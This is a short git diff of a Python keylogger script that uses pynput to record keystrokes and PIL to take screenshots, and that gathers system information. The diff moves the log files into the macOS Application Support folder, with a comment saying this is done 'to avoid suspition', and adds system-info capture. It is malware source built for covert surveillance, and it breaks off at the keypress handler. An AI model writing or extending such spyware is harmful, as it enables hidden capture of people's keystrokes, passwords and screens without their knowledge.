@@ -1,16 +1,19 @@
-# For now this keylogger notes the keystrokes and when we end the command to stop the file it notes the time, takes screenshot, notes the systeminfo
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
 import socket
 import time
 from requests import get
+import platform
+from pathlib import Path
 
-filepath = 'choose/path/to/your/file'
+home = str(Path.home())
+filepath = home + '/Library/Application Support/Your App name' #Keeping the files here to avoid suspition
 keylog = 'keylogger.txt'
 scrshot = 'screenshot.png'
 count = 0
 keys = []
 ttime = time.time()
+systeminfo = 'systeminfo.txt'
 currenttime = str(ttime)
 
 def on_press(key) :
